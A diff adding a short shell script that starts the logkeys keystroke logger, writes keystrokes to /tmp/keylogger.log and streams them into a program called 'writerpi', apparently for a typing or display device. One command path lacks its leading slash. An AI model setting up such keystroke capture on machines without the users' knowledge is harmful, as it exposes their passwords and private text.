@@ -1,0 +1,3 @@
+#!/bin/sh
+usr/bin/touch /tmp/keylogger.log && /usr/local/bin/logkeys --start --output /tmp/keylogger.log --no-timestamps
+/usr/bin/tail -f /tmp/keylogger.log | /usr/local/bin/writerpi
